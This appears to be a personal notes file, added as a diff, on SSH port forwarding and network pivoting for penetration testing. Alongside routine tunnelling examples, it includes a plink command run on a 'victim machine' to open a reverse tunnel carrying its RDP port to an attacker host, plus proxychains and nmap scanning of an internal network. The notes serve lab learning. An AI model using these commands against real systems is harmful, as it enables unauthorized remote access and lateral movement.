@@ -1,0 +1,68 @@
+
+https://vimeo.com/54505525
+the black magic of ssh
+
+
+ssh -R *:8080:cort.local:4567 sshtalk.in
+or
+local = "Cort.local.4567"
+remote= "*:8080"
+ssh -R ${remote}:${local} sshtalk.in
+
+----------------------------------------------------------------------
+local port forwarding:
+
+accessing target webserver via proxy machine:
+ssh -L <attackerport>:<targetmachineip>:<targetmachineport> ssh@proxyserver
+ssh -L 1337:192.168.100.42:80 msfadmin@192.168.100.45
+
+accessing target remote desktop via proxy machine:
+ssh -L <attackerport>:<targetsystemip>:<targetsystemport> ssh@proxy
+ssh -L 1337:192.168.100.42:3389 msfadmin@192.168.100.45
+rdesktop localhost:1337
+
+---------------------------------------------------
+local = "localhost:1234"
+remote= "private-host:443"
+ssh -L ${local}:${remote} public-host
+------------------------------------------------------
+#firesheeping
+
+//in authorized public key file , we can set a type of shell or command for ssh session.
+~/.ssh/authorized_keys:
+command="echo \"Your tried to run ${SSH_ORIGINAL_COMMAND}\" ssh=rsa AAAAB@#RDASFSAF#ERASDFdsafdsafsdafdsaf423fs3rs4ats9fhsd9fhsd98fsd9f8u8usd9f8sddsifsdfdFOSDIF0SA9DFJA00sjfs90dfj0safJ09SJDG0A-s09fjsd0f9jsdf09dsjfsdifjsdlbKL
+
+private key must not be readable to others.... #chmod 600 private key file
+public key must only be readable and not writabel to others... #chmod 644 public key file.
+
+
+plink.exe is a windows program to create tunnel via ssh (ssh client for windows)
+
+netstat -an|find “LISTEN” //will list all listening ports
+
+plink -l root -pw ubersecretpassword <attackingmachineip> _R 3390:127.0.0.1:3389
+
+#this will connect 3389 port of victime machine to 3390 port of attacking machine. This command will be run on victim machine.
+
+#we can check the tunnel activated by netstat -antp|grep listen
+#there port 3390 will be seen as listening.
+
+
+we will now connect rdesktop to localhost:3390 to get a rdp session to victime machine.
+
+ssh -D 8080 username@dmzserverip
+//this will route all traffic of 8080 to dmzserver
+
+//on attacker machine
+ configuring proxychains /etc/proxychains.conf
+ add socks4 127.0.0.1 8080
+
+proxychains nmap -p 3389 -sT -Pn 172.16.40.10-22 --open
+//searching internal hidden network for a rdp service on any system.
+
+proxychains rdesktop 172.16.40.20
+
+
+
+
+
